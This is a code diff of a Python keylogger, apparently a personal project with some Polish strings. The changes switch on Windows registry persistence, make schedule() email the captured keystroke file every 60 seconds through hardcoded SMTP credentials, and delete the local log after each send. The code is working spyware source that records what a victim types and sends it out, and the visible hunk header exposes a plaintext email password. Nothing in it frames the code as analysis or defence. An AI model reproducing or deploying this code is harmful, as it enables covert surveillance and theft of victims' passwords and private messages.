@@ -28,7 +28,6 @@ password = "amlfuahzumbkooxi"
 
 
 def send_email(filename, attachment, toaddr):
-    print("przygotowanie maila")
     fromaddr = email_address
     msg = MIMEMultipart()
     msg['From'] = fromaddr
@@ -100,15 +99,6 @@ def on_press(key):
         keys = []
 
 
-# def on_release(key):
-#         timer = Timer(interval=60, function=send_email(keys_information, file_path + extend + keys_information, toaddr))
-#         timer.daemon = True
-#         timer.start()
-#         send_email(keys_information, file_path +
-#                    extend + keys_information, toaddr)
-#         delete_keys_information()
-
-
 def write_file(keys):
 
     substitution = ['Key.enter', '[ENTER]\n',
@@ -137,21 +127,21 @@ def write_file(keys):
                 f.write(key)
             else:
                 f.write(str(key).replace("'", ""))
-    
-
 
 
 def delete_keys_information():
     try:
         os.remove(os.path.abspath(os.getcwd()) + '\\' + keys_information)
     except:
-        pass  
+        pass
+
 
 def delete_system_inforamtion():
-    try:    
+    try:
         os.remove(os.path.abspath(os.getcwd()) + '\\' + system_information)
     except:
         pass
+
 
 def current_time():
     now = datetime.now()
@@ -170,19 +160,18 @@ def add_to_registry():
     winreg.CloseKey(open)
 
 
-
 def schedule():
     timer = Timer(interval=60, function=schedule)
     timer.daemon = True
     timer.start()
     send_email(keys_information, file_path + extend + keys_information, toaddr)
-
+    delete_keys_information()
 
 
 def main():
     try:
-        #add_to_registry()
-        try: 
+        add_to_registry()
+        try:
             computer_information()
         except:
             pass
@@ -192,12 +181,11 @@ def main():
     except:
         pass
     with open(file_path + extend + keys_information, "w") as f:
-        f.write("Start")
-    schedule()       
+        f.write(f"Start {current_time()}")
+    schedule()
     with Listener(on_press=on_press) as listener:
         listener.join()
-        
-       
+
 
 if __name__ == '__main__':
     main()
